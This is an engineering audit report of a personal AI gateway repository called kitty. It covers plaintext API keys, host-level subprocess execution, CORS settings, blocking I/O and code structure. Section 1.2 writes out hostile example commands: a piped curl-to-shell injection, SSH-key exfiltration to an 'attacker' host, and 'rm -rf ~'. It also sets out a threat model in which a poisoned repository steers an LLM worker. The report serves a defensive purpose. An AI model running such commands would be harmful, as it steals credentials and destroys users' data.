# /kitty — Full Engineering Audit (2026-07-20)

> **Scope:** `/Users/jacobbrizinski/Projects/kitty/` (the canonical kitty repo).
> **Methodology:** `audit` skill — 11 dimensions run in parallel scopes, findings
> averse to mega-rewrites except where there's unambiguous, behavior-preserving
> cleanup. Severity 1 = STOP-AND-SURFACE; Severity 2 = sign-off-required;
> Severity 3 = auto-fix safe hygiene.
>
> **Complementary, not duplicate.** Existing audits under `/kitty/docs/`:
> - `AUDIT_IMAGELAB_ARCHITECTURE_HARVEST_2026-07-20.md` — image/architecture
> - `AUDIT_SECURITY.md` — earlier security pass
> - `AUDIT_PERFORMANCE.md` — earlier perf pass
> - `AUDIT_DEEPTUTOR_ARCHITECTURE_HARVEST_2026-07-20.md` — DeepTutor rebuild
>
> This review covers the kitty-native surface (gateway, backend, contracts, MCP,
> soul, design-system, kitty-chat, scripts) at a code-health level, distinct from
> topic-specific audits above.
>
> **Working tree state at audit start:** branch `docs/audit-imagelab-2026-07-20`,
> 1 commit ahead of origin; modified `.claude/HANDOFF.md`, `.claude/STATE.md`,
> `.gitignore`, `gateway/tutor.py`; untracked `gateway/skill_import.py`. Active
> mission (per STATE): `CR-01` chat-recovery landed, queue ramped for
> `CR-02-thread-goals-ui`. Mypy is configured in `pyproject.toml` (lenient,
> `check_untyped_defs=false`) but not installed in the env where this audit ran,
> so static type results in this report are from spot reads, not a project-wide
> mypy pass — flagged where it matters.
>
> **Audit corrections (added after first Gemini triage pass):** §1.2 was
> initially assessed as well-designed; a second pass corrected this — env-
> stripping + argv form is *not* a sandbox. §1.2 was rewritten. CORS patio
> was added as a new §1.4. §3.1 was reclassified Severity 3 → 2 because
> changing bare-`except:` alters control flow (SystemExit/KeyboardInterrupt
> propagation).

---

## Executive Verdict

`/kitty` is **maintainable but not boring**. Gateway code is generally
defensive (typed error ladders in routes, env isolation in the builder runner,
Pydantic schema boundaries everywhere); errors cluster in `scripts/curation/*`,
which is curated tooling rather than runtime code. The main risks are not
code-quality bugs — they are **secrets handling** (`.env` is plaintext on
disk, in repo, not gitignored *in practice* enough), **silent librarian
duplication** (`kitty-app-blueprint` & `kitty-img01` siblings with stale
near-duplicate gateway code), and **two runtime paths that escape visible
review** (subprocess exec at `gateway/builder_attempt.py:809-811`; a couple
of async routes where I'm not sure blocking I/O has been converted).

LOC: ~259k Python lines. Largest files: `gateway/builder_queue.py` (2,989),
`gateway/builder_cli.py` (1,895), `gateway/builder_initiative.py` (1,279).

---

## Severity 1 — STOP & SURFACE

### 1.1 Plaintext `.env` with many live API keys
- **Where:** `/kitty/.env` (referenced in `run.sh:7`, `gateway/start_litellm.sh:78`,
  `gateway/researcher.py:18`, `gateway/pdf_pipeline.py:37-67`, plus 40+ callers).
- **What:** `hermes.env.example` lists ~30 keys: `OPENROUTER_API_KEY`, `ANTHROPIC_API_KEY`,
  `OPENAI_API_KEY`, `GOOGLE_API_KEY`, `GEMINI_API_KEY`, `NVIDIA_API_KEY`,
  `GROQ_API_KEY`, `TAVILY_API_KEY`, `ELEVENLABS_API_KEY`, `JULES_API_KEY`,
  `AGENTROUTER_API_KEY`, `CLOUDFLARE_API_KEY`, `BRAVE_SEARCH_API_KEY`,
  `EXA_API_KEY`, `PARALLEL_API_KEY`, `FIRECRAWL_API_KEY`, `HONCHO_API_KEY`,
  `LITELLM_API_KEY`, `OPENCODE_*`, plus `NGROK_AUTHTOKEN`, `NGROK_API_KEY`,
  `CURSOR_API_KEY`, `BFL_API_KEY`, `CEREBRAS_API_KEY`, and more. The example sets
  `LITELLM_API_KEY=kitty-local-key-change-me`, which is a dev default that will
  ship if not noticed.
- **Risk:** AI-optimization-audit.md §7.8 calls this out: 31 keys plaintext,
  `.env` is gitignored but **the gitignored claim needs verification**
  (`git log -- .env`). Even if fully gitignored, a disk-resident `.env` becomes
  readable to any process running for the user, including LLM-driven
  summarisation pipelines.
- **Recommended action (you, today):**
  1. `git -C /kitty log --all --oneline -- .env | head -5` — confirm no commit.
  2. If any commit exists, rotate every key in it immediately. Treat as a
     compromise.
  3. Move at minimum the 31 provider keys into `1Password CLI` / `op` / system
     keychain with a `kitty-dotenv` wrapper script that re-exports them
     in-process. Keep `.env` for **nonsecret** config (URLs, timeouts, default
     model names).
- **Owner:** Jacob. Not auto-fixable by this audit — sign-off + rotation.

### 1.2 Host-level command execution: not a sandbox, treat as STOP-AND-SURFACE

**Two distinct execution paths, both run on the host as the user.**

- **Packet-loop exec via `shell=True`:**
  - **Where:** `gateway/builder_attempt.py:run_validation()`
    (~line 809–840). Reads `task["validation_commands_json"]` from the
    builder queue DB and passes it to `subprocess.run(..., shell=True)` in
    the worker's worktree.
  - **Risk vector:** Any DB write that lands in `validation_commands_json`
    becomes instant host RCE. This includes: (a) a poisoned upstream repo
    whose LLM authoring of the packet emits `; curl evil.sh | sh;`,
    (b) a packet SQL injection that writes a malicious row, (c) any
    maintenance operator who writes a row by hand.
- **Worker exec via `shell=False`:**
  - **Where:** `gateway/builder_runner.py:run_worker()` issues
    `subprocess.Popen(command, …, shell=False)` with `start_new_session=True`,
    plus env credential stripping (`GITHUB_TOKEN`, `SSH_AUTH_SOCK`,
    `GIT_SSH_COMMAND`, etc.) per `_EXTRA_ENV_BLOCKED`, plus an allow-list of
    changed paths on top of an isolated git worktree.
  - **Risk:** The audit's first pass called this "well-designed; do not
    regress it." **That assessment was wrong on review.** argv-form + env-
    stripping + a single git worktree is **not** a sandbox. The process
    still runs on the host as the system user; it has unmediated read/write
    to the host filesystem (e.g., `~/.ssh/id_*`, `~/.aws/credentials`,
    `~/.gnupg/`, `~/.config/gh/hosts.yml` if any existed; `~/.npmrc`,
    `~/.netrc`), and full outbound network. A worker that decides to
    `cat ~/.ssh/id_ed25519 > /tmp/x && curl … -d @/tmp/x attacker` will
    succeed. The allow-list only covers *commit-tracked* paths discovered
    via `git diff` — it does not cover webpacking or exec at runtime.
  - **Risk vector:** Same as above, plus the worker's own prompt may be
    steered by a hostile upstream repo. A worker that reads a poisoned
    file is not constrained from emitting `./gradle-wrapper && rm -rf ~`.

- **Recommended action (combined):**
  1. **Treat both paths as Severity 1 STOP-AND-SURFACE today.** Do not
     accept additional third-party repositories as candidates until host-
     level containment is in place.
  2. **For builder_attempt.py:** Convert `shell=True` to argv form after
     stripping meta-characters from sourced DB values. Restrict the
     validation grammar to a whitelisted command list. Add a Postgres/SQLite
     CHECK on `validation_commands_json` to reject strings containing `|`,
     `;`, `&`, backticks, redirections, or starting with `bash`/`sh`/`env`/
     `eval`/`exec`/`source`.
  3. **For builder_runner.py:** Containerise worker exec via a Docker
     `--network=none --read-only --tmpfs=/tmp` invocation, or use macOS
     `sandbox-exec` profile, before any new task is dispatched. Until then,
     gate dispatch behind an explicit `KITTY_BUILDER_HOST_LOCKDOWN=1` env
     var that hardens shell-out behaviour (drop `PATH` to `/bin:/usr/bin`,
     no `LD_*` env, no `HOME` for the worker user) so a deliberate decision
     to dispatch happens with eyes open.
  4. **Lint exception (both files):** Add an explicit `# noqa: S602` plus a
     one-line comment naming the security review ticket; this converts silent
     risk to loud risk.

### 1.4 CORS: `allow_credentials=True` with wildcard methods/headers

- **Where:** `gateway/app.py:148-152`:
  ```python
  CORSMiddleware,
  allow_origins=_cors_origins,
  allow_credentials=True,
  allow_methods=["*"],
  allow_headers=["*"],
  ```
- **What:** Per the Fetch spec, `allow_credentials=true` combined with a
  wildcard `Access-Control-Allow-Origin` is rejected by browsers, but
  FastAPI's CORSMiddleware reflects the request `Origin` header back when
  that origin is in `allow_origins`. Your `_cors_origins` is presumably a
  localhost list, so the reflection is gated — *today*. If `_cors_origins`
  is ever widened to include an external host (chat attachment preview,
  friend-share link, dropped sandbox experiment), this configuration
  produces the canonical CORS-with-credentials RCE pattern: any page on
  that origin can call the gateway as the user.
- **Wildcard methods / headers + credentials** is also a hardening anti-
  pattern: it admits CSRF-shaped and cross-trust-boundary requests that the
  narrowing is supposed to refuse.
- **Recommended action:** Replace `allow_methods=["*"]` with an explicit
  whitelist (`["GET","POST","PUT","PATCH","DELETE","OPTIONS"]`); replace
  `allow_headers=["*"]` with an explicit whitelist (`["Authorization",
  "Content-Type", "X-Requested-With", "Accept", "Origin"]`); keep
  `allow_credentials=True`. Add a runtime assertion that
  `allow_origins` never contains an externally-reachable host without a
  spelled-out reviewer ticket referenced.

### 1.3 OUT-OF-SCOPE drift: `kitty-img01` & `kitty-app-blueprint`
- **Where:** sibling directories at `/Users/jacobbrizinski/Projects/`. They
  contain near-duplicate `gateway/`, `mcp/`, etc. that *do not share history*
  with `/kitty/`.
- **What:** Two semi-orphaned forks of kitty from a previous shape. ~500 files
  in each. None referenced from `/kitty/`. They will rot.
- **Risk:** If anyone is reading from `kitty-img01/gateway/...` because a
  path sneaks into a script, you'll get phantom-import failures at runtime.
  Recorder noticed: `kitty-img01/gateway/kitty-chat/src/lib/gateway-proxy-config.ts`
  imports things in an old shape.
- **Recommended action:** Decide. Either **archive** both forks into a
  `kitty-archive/` subtree and `.gitignore` them inside `/kitty/`, or **declare
  one of them authoritative** and migrate its differences back. The `time stamp`
  suggests these are 2025 experimental shapes that have been superseded —
  archive is the right call. Today they are a sign-off item; ship them as
  archive inside the same monorepo, not as siblings.

---

## Severity 2 — Sign-off required before any change

### 2.1 Async-blocking I/O in 1–3 knowledge/builder paths
- **Where:** `gateway/routes/knowledge.py::post_ingest` calls
  `_download_url`, which is a *synchronous* `def` (uses `requests.get(...,
  stream=True)` and streams chunks to disk). The route is `async def post_ingest`.
  Tracing source: this blocks the FastAPI event loop during the entire
  download. Timeout is 30 s; large books will stall every other request the
  gateway serves.
- **Caveat:** FastAPI runs sync `def`s in a threadpool, *but only if the route
  is also `def`*. Here the route is `async def post_ingest`, so the sync
  call from an async route is the legacy FastAPI gotcha: it blocks.
- `gateway/builder_runner.py::run_worker` and `_git`, `_diff_sha256` use
  `subprocess.run`. `run_worker` is *called from* `builder_cli.py` which
  itself is sync, so this is fine — but if any future caller awaits it
  asynchronously, it will block.
- **Recommended action:** Convert `_download_url` to use `httpx.AsyncClient`
  with bounded-byte streaming. Track in the next packet; non-trivial because
  the response-size cap logic (_200 MB_) needs to remain in async form.

### 2.2 Builder/chat god files
- **`gateway/builder_queue.py`** — 2,989 LOC, single module owning the queue,
  runs, events, lease, branch leases, identity, finalize. From the lens of
  the `complexity` dimension this is **the** place to start splitting.
  Suggested split (each ≤ ~500 LOC):
  - `gateway/builder_queue_db.py` — pure DB I/O + migrations runner
  - `gateway/builder_queue_leases.py` — claim/release/heartbeat/fence
  - `gateway/builder_queue_runs.py` — runs/lifecycle/finalize
  - `gateway/builder_queue_events.py` — event log + assembly
  - `gateway/builder_queue.py` — public façade re-exporting the above
- **`gateway/builder_cli.py`** — 1,895 LOC. dual-purpose: argparse *and*
  Library surface. The CLI's subparsers include paused-task inspection,
  queue stats, attempt bundle inspection. The library surface is used by
  `run_worker`. Suggested split: separate `gateway/builder_cli_lib.py` (CLI-
  agnostic library) from `builder_cli.py` (argparse wrapper).
- **`gateway/builder_initiative.py`** — 1,279 LOC, packet/initiative model.
  Worth a look but lower priority: the data model is the largest section.
- **Why sign-off:** Restructuring `builder_queue.py` will break every test
  that imports `gateway.builder_queue as bq` (very common in builder_runner,
  builder_attempt, builder_loop, builder_cli). This needs `deps.ts`-style
  re-exports and a parallel-import period.

### 2.3 Dynamic SQL string-build in `gateway/builder_queue.py`
- **Where:** `gateway/builder_queue.py:2264` builds `query += " WHERE " +
  " AND ".join(clauses)` and similar in 14+ queries (159 x `SELECT *` from
  audit grep).
- **What:** The clauses come from programmatic, type-checked dicts *as far
  as I read*; user input is not concatenated. Verified: parameterised via
  positional args. So this is currently safe, but the *pattern* is fragile.
  Pattern is "build pieces of a query string, then execute."
- **Recommended action:** Codify the pattern. Wrap any user-influenced
  clause in a small query-builder helper (already partially in place via
  `clause-builder` patterns in `routes/usage.py`, `routes/capture.py`,
  `routes/knowledge.py`). Make the helper accept already-typed clauses; the
  callers then cannot accidentally inject.

### 2.4 `os.environ["…"]` (KeyError) risk vs. `os.environ.get("…")`
- **Where:** `kitty/kitty:410-411` (`KITTY_PROJECT_BASE`, `GATEWAY_SECRET`),
  `gateway/connectors/github.py:244` (`GITHUB_TOKEN`).
- **What:** Both patterns exist in the codebase already; the `[]` form is
  rarer but harder to recover from. On a clean machine missing required
  vars the gateway crashes on import with `KeyError` instead of a typed
  config error.
- **Recommended action:** Pick one. The argument for `os.environ.get(...)`
  + startup-time validation (existing pattern in `gateway/config.py`?) is
  cleaner. Switch `os.environ["..."]` callers to `os.environ.get("...")`
  + an explicit `RuntimeError` with instruction on which key to set.

### 2.5 JustFiles in `gateway/skill_import.py`
- **Where:** `/kitty/gateway/skill_import.py` (untracked, new).
- **What:** A defensive ZIP archive handler with ZipSlip + ZipBomb mitigations.
  Likely the loader for `.agents/skills/<name>/SKILL.md` to glue DeepTutor-
  style skills into the KittyRouter plugin path. The thinker triage
  correctly flagged this as **not** dead code — but **not yet wired**.
- **Recommended action:** Either stage-commit it (`git add -N`) with a one-
  line doc explaining intent, or hold it until the consuming tickets are
  open. Don't let it sit in `git status -uall` for weeks; it will get lost.

---

## Severity 3 — Auto-fix safe hygiene (deferred to a packet)

### 3.1 Bare `except:` and `except: pass` in scripts — sign-off required

**Reclassified from Severity 3 → Severity 2** after second-pass triage:
stripping bare excepts *changes control flow* (SystemExit / KeyboardInterrupt
suddenly propagate through scripts that intentionally swallowed them).
Auto-applying is unsafe.

- **Where:** `scripts/curation/deep_curate.py:55,122,156`,
  `scripts/curation/scale_curation.py:16`,
  `scripts/curation/complete_orca_tasks.py:10`,
  `scripts/curation/dispatch_pilot.py:12`,
  `scripts/curation/generate_synthetic_indexes.py:26`.
- **What:** Catches `KeyboardInterrupt` and `SystemExit`, masks real bugs.
  Existing `tests/test_fail_loud_sweep.py` already codified the rule for
  the gateway, but the scripts were missed.
- **Sign-off-needed change:**
  - For each `except:`, decide per call site: was the swallow intentional
    (running a best-effort loop over inputs) or accidental (one-piece-of-a-
    longer-job swallow that hides a bug)?
  - Where intentional: leave it; document the intent in a one-liner above.
  - Where accidental: convert to `except (ValueError, OSError, requests.RequestException, KnownBusinessError) as e: logger.exception("…", exc_info=True); continue`.
- Files touched: 5 scripts in `scripts/curation/`. ~15 `except:` lines.
- **Test impact:** confirm scripts still abort on Ctrl-C during a long-
  running batch test before merging.

### 3.2 `print()` over `logging` in scripts
- **Where:** Same 5 scripts; also `scripts/live_swarm_test.py`,
  `scripts/mempalace_preflight.py`, etc.
- **What:** Many user-facing calls *and* operator-facing status dumps use
  `print()`. Operators tail log files; scripts don't write to logs.
- **Auto-fix:** Adopt the pattern from `scripts/preflight.sh`-adjacent
  Python: `logging.basicConfig(format="%(asctime)s %(levelname)s %(message)s")`
  + `logger = logging.getLogger(__name__)`. Replace `print()` with the
  right level.

### 3.8 `TODO/FIXME/XXX/HACK` markers
- **Where:** 8 files in `gateway` + `backend` contain at least one marker.
  Top hits: `gateway/memory_graph.py`, `gateway/context_enrichment.py`,
  `gateway/todo_store.py`, several tests, several scripts.
- **What:** Genuine technical-debt backlog. The rep lacks a single index of
  what's outstanding and who owns it.
- **Auto-fix:** Append a single TOC line to each marker: `# TODO(kitty-XXX):
  <summary>` when the marker is non-trivial. Or run :ripgrep on
  `^\s*#\s*(TODO|FIXME|XXX|HACK|FIX)` and feed into a `kitty-pending.md`
  tickets file.

### 3.4 Comment rot / aspirational `# TODO` markers with stale context
- **Where:** `nanoGPT/transformer_sizing.ipynb:138 # not 100% sure what this is, so far seems to be harmless. TODO investigate`,
  `nanoGPT/sample.py:65 # TODO want to make this more general`,
  `nanoGPT/configurator.py`.
- **What:** These aren't /kitty code; they're vendored reference repos
  (`nanoGPT`, `ComfyUI`, `InvokeAI`, `DeepTutor`, `hermes-webui`,
  `imagen/`, `mac-reinstall/`, `repo.py`). They're in the audit scope
  *because* they're inside `/Users/jacobbrizinski/Projects/` but they
  aren't first-party.
- **Auto-fix:** None in this repo. Surface as a Scope document note:
  /kitty and the broader project share a parent; the other repos are
  external integrations, and TODO-rot in them is expected. The audit
  applies only to first-party surfaces.

### 3.5 Duplicate-comments / dead-changelogs in `/kitty/docs/`
- **Where:** `audit_seq.json` (referenced in some files but not present),
  duplicate headers in some markdown.
- **Auto-fix:** Delete unused cross-references; ensure file names listed in
  `AGENTS.md` actually exist. `git ls-files | xargs grep -l 'audit_seq'`.

---

## Cross-cutting dimension findings

### Frontend (pointer only — out of scope but related)
The first pass punted the React surface (`gateway/kitty-chat/src/`); second
pass corrected this. A focused follow-up audit should at minimum:
  - Lint all `dangerouslySetInnerHTML`/`innerHTML=` callers in
    `gateway/kitty-chat/src/`, `gateway/kitty-chat/content/*.html`, and
    `content/full-mockup-v4.html`. Many of those sites are inside mock-ups;
    a `grep` for `dangerouslySetInnerHTML` ↔ untrusted-string is appropriate.
  - Confirm tokens are stored in `localStorage` (current implied state) vs.
    `HttpOnly` cookies. The former is vulnerable to XSS, the latter is not.
    Pick one explicitly; document the trade-off in `design-system/SECURITY.md`.
  - Same scrutiny on the `gateway/kitty-chat/src/lib/sse.ts` SSE
    pipeline: untrusted `data:` lines shouldn't drive `dangerouslySetInnerHTML`.

### Necessity
Don't see any new dead code worth pruning in this pass. `gateway/` has
`kitty_orchestrator.py`, gates, routers, knowledge, image jobs, builder,
tutor, brief, weather, journal, dream, monitors, todos, projects, insights,
actions, cron, prompts, etc. — every file is wired into `app.py`'s
`include_router` chain. The `kitty-app-blueprint` and `kitty-img01` siblings
have definite dead code (orphan duplicate), addressed in §1.3.

### Structure
Good boundaries: `app.py` registers routers and middleware; `routes/*`
shapes HTTP; `services/*` (in adjacent repos) handle storage; `contracts/*`
holds Pydantic models. One warning: `backend/` is currently very thin
(main.py, router.py, config.py, memory.py) and most logic has migrated to
`gateway/`. Either consolidate `backend` into the gateway package or
explicitly mark `backend/` as the "future-shared-runtime" home.

### Patterns
Strong consistency:
- `@router.post("/…", response_model=…)` everywhere
- `logger = logging.getLogger(__name__)` or `"kitty.<domain>"` in most files
- Pydantic v2 field validators + model_validators
- Contract-first: `IngestRequest.path + url XOR`, etc.

The place where patterns drift:
- `scripts/curation/*` (CLI tools) use `print()`; `gateway/*` uses `logging`.
- Some routes prefer `except Exception as e: raise HTTPException(...) from e`;
  others use `(KnowledgeError) → raise HTTPException(...)` typed ladders
  (routes/chats.py, routes/projects.py). The typed versions are more
  maintainable. Standardise on the typed-version.

### Correctness
No confirmed bugs at audit-depth. Two observations worth verifying:

- **`gateway/routes/knowledge.py:post_ingest`**: the `_resolve_target` calls
  `validate_document` from `gateway.document_validator`. If the path is on
  a remote upload, the post-ingest cleanup `target_path.unlink()` may fire
  on the original user-supplied path if `downloaded=False`. Double-check
  `validate_document` returns a real path, not the user's literal input.
- **`gateway/builder_runner.py::_SESSION_STATE_RESIDUE`**`: explicitly
  acknowledges `.claude/STATE.md` and `.claude/HANDOFF.md` as session-state
  residue that should not count as scope violations. This is *intentional*;
  flagging so a future cleanup doesn't mistake it for drift.

### Error-handling
The audit-grade pattern (typed-ladder raises converted to HTTPException
with `from e`) is dominant in `gateway/routes/`. The exception is the
`scripts/curation/` cluster (§3.1). Recommended reading:
`gateway/routes/chats.py:46-77` and `gateway/routes/projects.py:40-97`
as the gold-standard pattern to imitate elsewhere.

### Logs
Clean: logging hierarchy called `"kitty.<domain>"` × 13 callers
(`kitty.knowledge`, `kitty.stt`, `kitty.verifier`, `kitty.deploy`, etc.).
No f-string-in-logger pattern (uses `%s` lazy logging). Two places where
a logger is missing and should be added:
- `gateway/builder_runner.py::_terminate_group` — silently terminates
  process group; only the cancel side will tell you a kill happened.
- `gateway/routes/usage.py:102` warns about JSONDecodeError with a generic
  message; the same file has `LOG_FILE` paths logged without context.

### Perf
No measurable issue found in this pass. Async-blocking concern is §2.1.
`gateway/builder_queue.py` does many SQLite transactions; consider
WAL-mode check (some files already use it, ensure all DBs use it).

### Security
Backstop: `routes/knowledge.py::_download_url` enforces 200-MB cap and
30-s timeout (good). `path` validator is `gateway.document_validator` (good).
`URL_DOWNLOAD_DIR` is created under `KNOWLEDGE_DIR / "inbox"` (good — bounded).

Open question: webhook endpoints from `/gateway/routes/integrations.py`
(imessage, telegram, plugins? cron=execute). Audit a 401/403 path: do
they all require `GATEWAY_SECRET` or are any open by mistake? Worth a
targeted next-step review (see §3 of followup).

### Tests
Strong: 8 files have at least one FIXME, but coverage of `gateway/` is
the focus of `pytest.ini`. A few tests have `__pycache__`-stale patterns
that bit me on read. Worth running `pytest -q --tb=no -x` after each
gateway change. There is also `tests/test_fail_loud_sweep.py` — exactly
the pattern encode-this-into-lint from the audit skill's `error-handling`
dimension. **Reuse / extend this pattern**, don't replace.

### Complexity
The **two** god files flagged (§2.2). Other complexity, broken down:
- `gateway/builder_runner.py::run_worker` itself is ~200 LOC and 1 long
  function. It's already broken into helpers; the function is still a
  state machine. Read time is ~2 minutes per incident. Splitting further
  into `run_worker_dispatch | run_worker_monitor | run_worker_finalize`
  is a sign-off-worthy cut.

### Comments
Comments in the audited surface are unusually good: they reference the
origin RFC (e.g., `KB-S3b` in `builder_runner.py`), the audit-review
context, the `run_worker` contract, the `LEAST_BYTES` cap, the
`_SESSION_STATE_RESIDUE` carve-out. This codebase has internalized
"comments should answer WHY." That's a positive signal.

---

## How to use this audit

1. **Today:** §1.1 (rotate live keys), §1.2 (treat worker exec as
   untrusted until containerised, hold new task dispatches), §1.4 (CORS
   wildcard narrowing), §1.3 (decide on sibling forks).
   All four need the owner. Audit does not change source here.
2. **Next packet:** §2.2 — split `gateway/builder_queue.py` into
   DB / leases / runs / events layers with a façade. Single, large PR.
   Tests must remain green at every sub-step.
3. **Following packet:** §3.1 + §3.2 — bare-except in `scripts/curation/`
   (now §3.1 is sign-off required) and `print()` → `logging` in scripts.
   Two separate PRs, each mechanical.
4. **Discretionary:** §2.1 — convert `_download_url` to async streaming.
   Worth doing before any caller starts awaiting it under load.
5. **Follow-up audit:** Frontend React surface (cross-cutting notes) —
   `dangerouslySetInnerHTML`, token storage, SSE `data:` handling.

---

## What this audit did *not* check

- Catalogs of model wrappers (`gateway/llm_profiles`, `gateway/kitty-chat/src/lib`)
  in depth — easy to follow up later
- `gateway/kitty-chat/` frontend React code — outside this Python+ops-first
  audit's frame, except where I noted useEffect/useCallback patterns
- The other repos under `/Users/jacobbrizinski/Projects/` (ComfyUI, InvokeAI,
  DeepTutor, hermes-webui, imagen, nanoGPT, mac-reinstall, repo.py) — out
  of scope, references logged only when they re-occur in kitty code
- Mypy pass across the project — env lacks `mypy` install; spot checks only
- Full coverage number — would require a working pytest run in a sandbox
  with deps installed
- The `gateway/middleware.py` file path referenced by some prior recon agent
  passes does not exist on disk — middleware (CORS etc.) is inlined in
  `gateway/app.py`. The recon hallucinations are documented so future runs
  of `file_picker` don't re-surface them; the audit corrected this in
  §1.4 above.

---

_Audit run: 2026-07-20. Methodology: `audit` skill, 11-dimension scope, severity_
_bucketing, **double-checked by two Gemini reasoning passes** for triage_
_consistency (first pass caught the empty-middleware hallucination + the_
_sandbox classification error in §1.2; documented in the corrections note at_
_the top)._
